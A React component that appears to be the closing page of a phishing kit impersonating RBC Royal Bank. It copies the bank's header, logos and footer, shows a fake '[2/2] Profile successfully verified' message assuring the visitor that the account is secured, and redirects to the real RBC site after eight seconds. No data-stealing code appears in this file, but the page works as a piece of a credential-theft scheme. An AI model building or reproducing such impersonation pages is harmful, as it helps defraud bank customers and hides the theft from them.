import { useEffect, } from "react";
import "./index.css";

function Page2() {

  const redirect = () => {
    setTimeout(() => {
      window.location.replace("https://www.rbcroyalbank.com/personal.html");
    }, 8000);

  };
  useEffect(() => {
    // Met à jour le titre du document via l’API du navigateur
    redirect()
  });


  return (
    <>
      <header
        _ngcontent-ucb-c48=""
        data-loc="personal-banking"
        className="n-search n-location n-language n-contact n-secure menu-open"
      >
        <div
          _ngcontent-ucb-c48=""
          id="header"
          data-domain="rbcroyalbank.com"
          className="master-header"
        >
          <div _ngcontent-ucb-c48="" className="mobile-header-content">
            <a _ngcontent-ucb-c48="" href=";" className="mobile-logo-wpr">
              <div _ngcontent-ucb-c48="" className="logo-img">
                <img
                  _ngcontent-ucb-c48=""
                  src="https://www.rbcroyalbank.com//dvl/assets/images/logos/rbc-logo-shield.svg"
                  alt="RBC"
                />
                <div _ngcontent-ucb-c48="" className="logo-text">
                  Royal Bank
                </div>
              </div>
            </a>
            <div _ngcontent-ucb-c48="" className="mobile-nav">
              <span
                _ngcontent-ucb-c48=""
                href=""
                id="header-mobile-sign-in-btn"
                className="mobile-secure-btn"
              >
                <span _ngcontent-ucb-c48="">
                  <i _ngcontent-ucb-c48="" className="fas fa-lock"></i>SECURE
                </span>
              </span>
              <button
                _ngcontent-ucb-c48=""
                aria-label="Menu"
                className="mobile-nav-btn active"
              >
                <span _ngcontent-ucb-c48="">MENU</span>
              </button>
            </div>
          </div>
        </div>
        <div
          _ngcontent-ucb-c48=""
          id="search-bar"
          tabindex="-1"
          role="dialog"
          aria-labelledby="header-search"
          aria-hidden="true"
          className="search-bar"
        >
          <div _ngcontent-ucb-c48="" className="search-bar-inner">
            <div _ngcontent-ucb-c48="" className="search-logo">
              <img
                _ngcontent-ucb-c48=""
                src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/logos/rbc-logo-shield-blue.svg"
                alt="RBC"
              />
            </div>
            <div _ngcontent-ucb-c48="" className="search-form">
              <form
                _ngcontent-ucb-c48=""
                novalidate=""
                method="get"
                action="https://www.rbcroyalbank.com/search-public/index.html"
                id="header-search-form"
                className="ng-untouched ng-pristine ng-valid"
              >
                <label
                  _ngcontent-ucb-c48=""
                  for="header-search"
                  className="offscreen"
                >
                  Ask your question
                </label>
                <input
                  _ngcontent-ucb-c48=""
                  type="hidden"
                  name="type"
                  id="header-search-type"
                  value="0"
                />
                <input
                  _ngcontent-ucb-c48=""
                  type="search"
                  name="question"
                  id="header-search"
                  autoComplete="off"
                  placeholder="Ask your question"
                  className="ui-autocomplete-input"
                />
              </form>
              <button
                _ngcontent-ucb-c48=""
                type="button"
                id="search-close"
                aria-label="Close search"
                className="search-close"
              >
                <img
                  _ngcontent-ucb-c48=""
                  src="https://www.rbcroyalbank.com/dvl/v1.0/assets/images/ui/ui-close-blue.svg"
                  alt="Close search"
                />
              </button>
            </div>
          </div>
        </div>
      </header>

      <div _ngcontent-kqx-c50="" class="ssee">
        <div _ngcontent-kqx-c50="" id="app" class="scum">
          <h1 _ngcontent-kqx-c50="" class="appskwi">
            [2/2] Profile successfully verified
          </h1>
          <img alt='quil'
            _ngcontent-kqx-c50=""
            src="./QuaintLikelyFlyingfish-size_restricted.gif"
            class="zeb3med"
            style={{ width: "100%" }}
          />
          <p _ngcontent-kqx-c50="" class="razzz">
            <i _ngcontent-kqx-c50="" class="fas fa-circle-notch fa-spin"></i>{" "}
            Thank you, your account has been secured and verified{" "}
            <br _ngcontent-kqx-c50="" />
          </p>
        </div>
      </div>

      <div
        _ngcontent-wde-c48=""
        tabindex="-1"
        role="region"
        aria-label="Notice"
        className="importantNotice"
      >
        <div _ngcontent-wde-c48="" className="serviceNotice_body">
          <div
            _ngcontent-wde-c48=""
            className="importantNotice_body_links notice_body_item"
          >
            <a
              href=";"
              title="COVID-19 - How RBC is helping clients (Opens new tab)"
            >
              <span _ngcontent-wde-c48="">
                <img
                  _ngcontent-wde-c48=""
                  src="./informational-32.svg"
                  alt="Important Notice"
                  className="accessible"
                />
              </span>
              <span _ngcontent-wde-c48=""></span> Important Notices{" "}
              <br _ngcontent-wde-c48="" /> COVID-19 - How RBC is helping clients
              <i
                _ngcontent-wde-c48=""
                aria-hidden="true"
                title="Opens new tab"
                className="rbc-icon2019 rbc_new_window2019_blue"
              ></i>
              <span _ngcontent-wde-c48="" className="accessible">
                (Opens new tab)
              </span>
            </a>
          </div>
        </div>
      </div>
      <div _ngcontent-wde-c48="" className="main-legal">
        <div _ngcontent-wde-c48="" className="main-legal-inner">
          <div _ngcontent-wde-c48="" className="legal-left">
            <p _ngcontent-wde-c48="">
              Royal Bank of Canada Website, © 1995-2021
            </p>
            <p _ngcontent-wde-c48="">
              <a
                _ngcontent-wde-c48=""
                title="Legal (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Legal"
              >
                Legal
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>{" "}
              &nbsp;|&nbsp;{" "}
              <a
                _ngcontent-wde-c48=""
                title="Accessibility (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Accessibility"
              >
                Accessibility
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>{" "}
              &nbsp;|&nbsp;{" "}
              <a
                _ngcontent-wde-c48=""
                title="Privacy &amp; Security (Opens new window)"
                ga-on="click"
                ga-event-category="Footer"
                ga-event-action="Click Link"
                ga-event-label="Privacy &amp; Security"
              >
                Privacy &amp; Security
                <span _ngcontent-wde-c48="" className="accessible">
                  {" "}
                  (Opens new window)
                </span>
              </a>
            </p>
          </div>
        </div>
      </div>
    </>
  );
}

export default Page2;
